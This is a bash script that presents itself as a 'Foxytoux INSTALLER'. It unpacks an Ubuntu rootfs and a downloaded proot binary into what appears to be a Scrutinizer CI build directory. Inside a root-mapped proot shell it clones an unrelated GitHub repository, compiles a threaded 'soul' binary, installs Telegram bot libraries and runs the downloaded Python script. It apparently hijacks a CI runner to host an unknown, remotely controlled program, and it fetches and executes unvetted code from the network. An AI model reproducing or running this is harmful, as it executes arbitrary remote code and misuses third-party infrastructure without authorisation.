#!/bin/bash

set -e  # Exit on error

ROOTFS_DIR=${SCRUTINIZER_BUILD_DIR:-$(pwd)}
export PATH="$PATH:$HOME/.local/usr/bin"

max_retries=50
timeout=1
ARCH=$(uname -m)

if [ "$ARCH" = "x86_64" ]; then
  ARCH_ALT="amd64"
elif [ "$ARCH" = "aarch64" ]; then
  ARCH_ALT="arm64"
else
  echo "Unsupported CPU architecture: ${ARCH}"
  exit 1
fi

if [ ! -e "$ROOTFS_DIR/.installed" ]; then
  echo "#######################################################################################"
  echo "#                                      Foxytoux INSTALLER                              #"
  echo "#                           (C) 2024, RecodeStudios.Cloud                              #"
  echo "#######################################################################################"
  install_ubuntu="YES"
fi

if [ "$install_ubuntu" = "YES" ]; then
  wget --tries="$max_retries" --timeout="$timeout" --no-hsts -O /tmp/rootfs.tar.gz \
    "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz" || { echo "Failed to download rootfs"; exit 1; }

  tar -xf /tmp/rootfs.tar.gz -C "$ROOTFS_DIR"
fi

if [ ! -e "$ROOTFS_DIR/.installed" ]; then
  mkdir -p "$ROOTFS_DIR/usr/local/bin"

  wget --tries="$max_retries" --timeout="$timeout" --no-hsts -O "$ROOTFS_DIR/usr/local/bin/proot" \
    "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}" || { echo "Failed to download proot"; exit 1; }

  chmod 755 "$ROOTFS_DIR/usr/local/bin/proot"
fi

if [ ! -e "$ROOTFS_DIR/.installed" ]; then
  echo -e "nameserver 1.1.1.1\nnameserver 1.0.0.1" > "${ROOTFS_DIR}/etc/resolv.conf"
  rm -rf /tmp/rootfs.tar.gz /tmp/sbin
  touch "$ROOTFS_DIR/.installed"
fi

CYAN='\e[0;36m'
WHITE='\e[0;37m'
RESET_COLOR='\e[0m'

display_success() {
  echo -e "${WHITE}___________________________________________________${RESET_COLOR}"
  echo -e "           ${CYAN}-----> Mission Completed! <----${RESET_COLOR}"
}

clear
display_success

"$ROOTFS_DIR/usr/local/bin/proot" \
  --rootfs="$ROOTFS_DIR" \
  -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit \
  /bin/sh -c "apt update && \
  apt install -y sudo python3-pip git ufw && \
  git clone https://github.com/bool-anony1764/Hello && \
  cd Hello && \
  g++ -std=c++14 soul.cpp -o soul -pthread && \
  pip install telebot pytz flask aiogram pymongo pyTelegramBotAPI python-telegram-bot motor && \
  python3 soul.py"
